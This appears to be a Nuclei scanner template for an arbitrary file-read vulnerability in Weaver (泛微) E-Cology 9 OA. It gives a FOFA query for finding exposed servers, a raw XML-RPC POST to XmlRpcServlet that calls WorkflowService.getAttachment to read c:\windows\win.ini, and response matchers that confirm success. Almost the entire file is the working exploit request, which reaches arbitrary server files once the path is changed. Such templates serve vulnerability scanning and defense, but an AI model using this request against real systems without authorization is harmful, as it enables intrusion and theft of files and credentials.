id: weaver-ecology-v9-XmlRpcServlet-fileread
info:
  name: 泛微 OA E-Cology 9 XmlRpcServlet - fileread
  author: leadlife
  severity: high
  metadata:
    max-request: 1
    verified: true
    fofa-query: app.name=="泛微 e-cology 9.0 OA"
  description: 泛微 OA XmlRpcServlet 任意文件读取漏洞
  tags: weaver, fileread, ecology , oa
http:
  - raw:
      - |+
        POST /weaver/org.apache.xmlrpc.webserver.XmlRpcServlet HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml
        
        <?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>WorkflowService.getAttachment</methodName><params><param><value><string>c:\windows\win.ini</string></value></param></params></methodCall>

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "methodResponse"
          - "base64"
        condition: and
        
      - type: status
        status:
          - 200

